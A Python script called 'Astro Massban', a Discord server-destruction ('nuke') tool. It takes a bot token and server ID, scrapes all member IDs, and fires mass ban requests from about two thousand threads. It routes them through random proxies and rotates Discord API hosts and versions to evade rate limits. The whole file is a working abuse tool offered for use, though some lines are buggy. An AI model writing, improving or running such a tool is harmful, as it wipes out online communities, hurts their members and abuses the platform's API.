import os
import sys
import time
import queue
import random
import httpx
import discord
import threading
from pystyle import Colorate, Colors
from discord.ext import commands

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix = "astro!",case_insensitive = False,bot = True,intents=intents)
amount = 0

def slow_write(text):
    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.005)

class astro:
    if os.name == "nt":
       os.system("cls")
    else:
       terminal_title = "Astro Massban - Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")

    logo = f'''                                                                                                                                                                                   ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"                             :::      :::::::: ::::::::::: :::::::::   ::::::::
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                            +#++:++#++: +#++:++#++    +#+     +#++:++#:  +#+    +:+
                 , ..:.::o:ooOoOO8O888O8O,COCOO"                             +#+     +#+        +#+    +#+     +#+    +#+ +#+    +#+
                , . ..:.::o:ooOoOOOO8OOOOCOCO"                              ###     ###  ########     ###     ###    ###  ########
                 . ..:.::o:ooOoOoOO8O8OCCCC"o
                    . ..:.::o:ooooOoCoCCC"o:o                                                    --------------
                    . ..:.::o:o:,cooooCo"oo:o:                                               _   __      __
                 `   . . ..:.:cocoooo"'o:o:::'                                              / | / /_  __/ /_____  _____
                 .`   . ..::ccccoc"'o:o:o:::'                                              /  |/ / / / / //_/ _ \/ ___/
                :.:.    ,c:cccc"':.:.:.:.:.'                                              / /|  / /_/ / ,< /  __/ /
              ..:.:"'`::::c:"'..:.:.:.:.:.'                                              /_/ |_/\__,_/_/|_|\___/_/
            ...:.'.:.::::"'    . . . . .'
           .. . ....:."' `   .  . . ''
         . . . ...."'
         .. . ."'
        .


> astro.cybin.cc
> made by horrid
---------------------------------------------------------------------------------------------------------------------------------------------

                                 $ That's one small step for man, one giant leap for mankind. - Armstrong $

---------------------------------------------------------------------------------------------------------------------------------------------
                                                                    Log:

'''
    print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - loading script...", 1))
    time.sleep(5)
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - done, press enter to start.", 1))
    input()
    if os.name == "nt":
       os.system("title Astro-V1")
       os.system("cls")
    else:
       terminal_title = "Astro Massban | Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")
    print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
    token = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter token: \u001b[0m", 1))
    guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
    q = queue.Queue()
    headers = {"Authorization": f"Bot {token}"}
    apiv = ["v9", "v6"]
    count = 0

    def massbansend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, proxies=proxy)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                    input()
                    input()
                    input()
                    input()
                astro.q.task_done()
        except Exception as err:
            print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - error sending requests, contact horrid or nell, or press enter to continue at your own risk.", 1))
            print(err)
            input()

    def idworker():
        for memberid in open("scraped/ids.txt"):
            ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}"]
            astro.q.put((httpx.put, random.choice(ranidapi), astro.headers))
        astro.q.join()

    def massbanworker():
        for member in open("scraped/scraped.txt"):
            ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
            astro.q.put((httpx.put, random.choice(ranapi), astro.headers))
            amount += 1
            os.system(f"title AstroV2 - Bans: {amount}")
        astro.q.join()

    @client.event
    async def on_connect():
        try:
            guild = await client.fetch_guild(int(astro.guild))
        except:
            print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - guild id is invalid", 1))
            input()
            os._exit(0)

        print("astro@localhost - scraping..")
        members = await guild.chunk()
        print("astro@localhost - done.")
        with open('scraped/scraped.txt', 'a') as z:
            for member in members:
                z.write(str(member.id) + "\n")
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - ban ids? [y/n]", 1))
        option = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - choice: \u001b[0m", 1))
        if option == "n":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.massbanworker()
        else:
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            astro.idworker()

if __name__ == "__main__":
    for x in range(1000):
        t = threading.Thread(target=astro.massbansend, daemon=True).start()
        t2 = threading.Thread(target=astro.massbansend, daemon=True).start()
    try:
        client.run(astro.token)
    except:
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - token is invalid or ratelimited.", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - please make sure you have all intents enabled on your bots token.", 1))
        input()
        exit()
